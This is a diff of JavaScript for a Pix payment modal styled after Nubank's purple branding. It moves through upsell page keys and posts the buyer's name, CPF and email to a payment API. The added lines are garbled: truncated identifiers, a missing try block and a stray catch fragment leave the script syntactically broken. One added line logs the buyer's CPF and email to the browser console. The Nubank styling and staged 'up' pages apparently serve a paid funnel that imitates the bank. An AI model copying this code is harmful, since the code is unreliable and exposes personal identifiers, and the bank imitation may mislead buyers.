@@ -95,7 +95,9 @@ window.redirect = redirect;
 // Alias: as páginas originais chamavam redirectToPayment(); reaproveita o upKey da URL.
 function redirectToPayment() {
   var m = window.location.pathname.match(/\/(up\d+)/);
-  _pixOpenModal(m ? m[1] : 'up1');
+  var upKey = m ? m[1] : 'up1';
+  console.log('[PIX] redirectToPayment chamado | upKey:', upKey);
+  _pixOpenModal(upKey);
 }
 window.redirectToPayment = redirectToPayment;
 
@@ -108,10 +110,12 @@ function _nuNext(upKey) {
 function _pixOpenModal(upKey) {
   if (!PIX_PRODUCTS[upKey]) upKey = 'up1';
   var modal = document.getElementById('pix-modal');
-  if (!modal) return;
+  console.log('[PIX] _pixOpenModal chamado | upKey:', upKey, '| modal existe:', !!modal);
+  if (!modal) { console.error('[PIX] ERRO: modal pix-modal não foi encontrado!'); return; }
   if (_pixInFlight) return; // trava clique-duplo: não gera 2 transações
   _pixInFlight = true;
   _pixCurrentUpKey = upKey;
+  console.log('[PIX] Abrindo modal para:', upKey);
 
   modal.style.display = 'flex';
   document.getElementById('pix-loading').style.display = 'block';
@@ -128,6 +132,7 @@ function _pixOpenModal(upKey) {
 
   var ac = ('AbortController' in window) ? new AbortController() : null;
   var to = ac ? setTimeout(function () { ac.abort(); }, 15000) : null;
+  console.log('[PIX] Chamando /api/pix com dados:', { upKey, nome: c.nome, cpf: c.cpf, email: c.email });
   fetch('/api/pix', {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
@@ -136,7 +141,8 @@ function _pixOpenModal(upKey) {
   })
     .then(function (r) { if (to) clearTimeout(to); return r.json(); })
     .then(function (data) {
-      if (!data.success) { alert('Erro ao gerar o Pix. Tente novamente.'); _pixCloseModal(); return; }
+      console.log('[PIX] Resposta da API:', data);
+      if (!data.success) { console.error('[PIX] API retornou success=false:', data.message); alert('Erro ao gerar o Pix. Tente novamente.'); _pixCloseModal(); return; }
 
       var msg = PIX_MESSAGES[upKey] || { emoji: '💳', titulo: 'Pagamento via Pix', sub: 'Pague agora e continue o processo.' };
       document.getElementById('pix-msg-emoji').textContent = msg.emoji;
@@ -144,11 +150,25 @@ function _pixOpenModal(upKey) {
       document.getElementById('pix-msg-sub').textContent = msg.sub;
 
       var amountFmt = 'R$ ' + Number(data.amount).toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
-      document.getElementById('pix-amount-display').textContent = amountFmt;
-
+      docume
+        console.log('[PIX] Gerando QR code local com qrcode()');
+        var q = qrcode(0, 'M'); 
+        q.addData(data.qrcode); 
+        q.make(); 
+        document.getElementById('pix-qr-img').src = q.createDataURL(5, 4);
+        console.log('[PIX] QR code local gerado com sucesso');
+      }
+      catch (e) { 
+        console.warn('[PIX] Falha ao gerar QR code local, usando API fallback:', e.message);
+        document.getElementById('pix-qr-img').src = 'https://api.qrserver.com/v1/create-qr-code/?data=' + encodeURIComponent(data.qrcode) + '&size=188x188&margin=6&bgcolor=ffffff'; 
+     
       try { var q = qrcode(0, 'M'); q.addData(data.qrcode); q.make(); document.getElementById('pix-qr-img').src = q.createDataURL(5, 4); }
       catch (e) { document.getElementById('pix-qr-img').src = 'https://api.qrserver.com/v1/create-qr-code/?data=' + encodeURIComponent(data.qrcode) + '&size=188x188&margin=6&bgcolor=ffffff'; }
-
+err) { 
+      console.error('[PIX] Erro na chamada da API:', err);
+      alert('Erro de conexão. Tente novamente.'); 
+      _pixCloseModal(); 
+   
       document.getElementById('pix-code').value = data.qrcode;
       _pixCurrentTxn = data.txnId;
 
@@ -242,7 +262,8 @@ function pixCheckNow(btn) {
       if (btn) { btn.disabled = false; btn.style.opacity = '1'; }
     });
 }
-window.pixCheckNow = pixCheckNow;
+wiconsole.log('[PIX] DOMContentLoaded - Criando modal PIX');
+  ndow.pixCheckNow = pixCheckNow;
 
 /* ─── markup do modal (roxo Nubank) ─── */
 document.addEventListener('DOMContentLoaded', function () {
@@ -261,6 +282,7 @@ document.addEventListener('DOMContentLoaded', function () {
 
   var el = document.createElement('div');
   el.id = 'pix-modal';
+  console.log('[PIX] Modal element criado com ID: pix-modal');
   el.style.cssText = 'display:none;position:fixed;z-index:99999;inset:0;background:rgba(20,10,30,.78);backdrop-filter:blur(8px);-webkit-backdrop-filter:blur(8px);align-items:center;justify-content:center;padding:10px;';
   el.innerHTML = [
     '<div id="pix-modal-card" style="background:#fff;border-radius:26px;width:100%;max-width:430px;box-shadow:0 40px 100px rgba(0,0,0,.45);overflow:hidden;max-height:97vh;overflow-y:auto;">',
@@ -372,5 +394,6 @@ document.addEventListener('DOMContentLoaded', function () {
 
     '</div>',
   ].join('');
+  console.log('[PIX] Modal adicionado ao body');
   document.body.appendChild(el);
 });
